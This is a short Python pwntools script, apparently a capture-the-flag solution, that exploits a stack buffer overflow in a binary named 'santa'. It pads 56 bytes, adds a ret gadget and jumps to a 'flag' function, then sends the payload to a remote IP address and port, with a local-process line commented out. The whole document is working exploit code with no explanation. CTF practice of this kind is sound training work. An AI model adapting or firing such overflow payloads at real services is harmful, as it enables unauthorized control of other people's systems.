from pwn import *

offset = 56
flag = 0x0000000000401152
ret = 0x0000000000401016

payload = b""
payload += b"A"*offset
payload += p64(ret)
payload += p64(flag)

host = "34.65.54.58"
port = 1340

s = remote(host, port)
# s = process("./santa")

print(s.recvline().decode())
s.sendline(payload)
print(s.recvall().decode())

s.close()